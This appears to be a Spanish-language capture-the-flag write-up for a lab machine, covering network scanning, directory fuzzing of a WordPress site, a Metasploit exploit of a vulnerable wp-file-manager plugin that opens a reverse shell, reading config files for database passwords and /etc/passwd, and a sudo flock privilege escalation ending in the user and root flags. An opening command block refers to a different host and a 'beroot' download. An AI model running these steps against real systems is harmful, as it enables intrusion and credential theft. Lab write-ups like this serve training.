
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.34 -oN escaneo
gobuster dir -u http://10.0.2.34/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
gobuster dir -u http://10.0.2.34/secret/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
msfdb init && msfconsole
ssh bonita@10.0.2.33 -i id_rsa
wget http://10.0.2.33:8080/beroot
```
Primero de todo realizamos un arp-scan para encontrar la IP y una vez tengamos su IP realizamos un nmap y vemos que están abiertos los puertos 33060 en el que corre un servicio mysql y 80.
![[Pasted image 20240312004442.png]]
Primero nos metemos a la web pero encontramos una apache por defecto así que procedemos ha hacer fuzzing y encontramos el directorio secret.
![[Pasted image 20240312004636.png]]
Pero cuando nos metemos no encontramos nada interesante así que volvemos a hacer fuzzing sobre el directorio secret y encontramos que estamos en un wordpress.
![[Pasted image 20240312005609.png]]
Al invetigar el directorio wp-contetn llegaremos a la dirección http://10.0.2.34/secret/wp-content/uploads/2020/10/ donde encontramos el siguiente archivo que nos dice que se está usando una versión vulnerable de wp-file-manager.
![[Pasted image 20240312005556.png]]
Ahora abriremos metasploit para intentar explotar la vulnerabilidad
```Metasploit
search wp-file-manager
use 0
show options
set ForceExploit true
set TARGETURI /secret
set RHOSTS 10.0.2.34
set LHOST 10.0.2.4
run
```
![[Pasted image 20240312010051.png]]
Ahora usamos el meterpreter para ir por la máquina
```bash
shell
script /dev/null -c bash
cat /etc/wordpress/config-192.168.1.122.php
mysql -uwordpress -pmyfuckingpassword
cd /usr/share/wordpress
cat wp-config.php
cat /etc/passwd
su adrian
```
Miramos el archivo la carpeta /etc/wordpress/ que se menciona en el servicio web y encontramos un archivo con usuario y contraseña para sql
![[Pasted image 20240312012758.png]]
```mysql
show databases;
use wordpress;
show tables,
select * from wp_users;
```
Entramos a la base de datos sql y miramos sus bases de datos
![[Pasted image 20240312013403.png]]
Ahora miramos las tablas.
![[Pasted image 20240312013702.png]]
Y nos metemos vemos el contenido de la tabla wp_users.
![[Pasted image 20240312013746.png]]
Como en la base de datos no encontramos nada vamos  a mirar ahora el directorio /usr/share/wordpress y haciendo un cat sobre wp-config.php encontramos una contraseña
![[Pasted image 20240312014512.png]]
Ahora buscamos usuarios en el /etc/passwd y encontramos el usuario adrian.
![[Pasted image 20240312014628.png]]
```bash
cd /home/adrian
cat user.txt
sudo flock -u / /bin/sh -p
cat /root/root.txt
```
Entonces probamos la contraseña anterior con adrian y somos el usuario adrian además de obtener la flag de user
![[Pasted image 20240312014815.png]]
Ahora hacemos un sudo -l y encontramos un exploit a flock en gtfo que nos permite escalar privilegios y obtener la flag de root.
![[Pasted image 20240312015122.png]]

Flag de user: HMViuploadfiles
Flag de root: HMVididit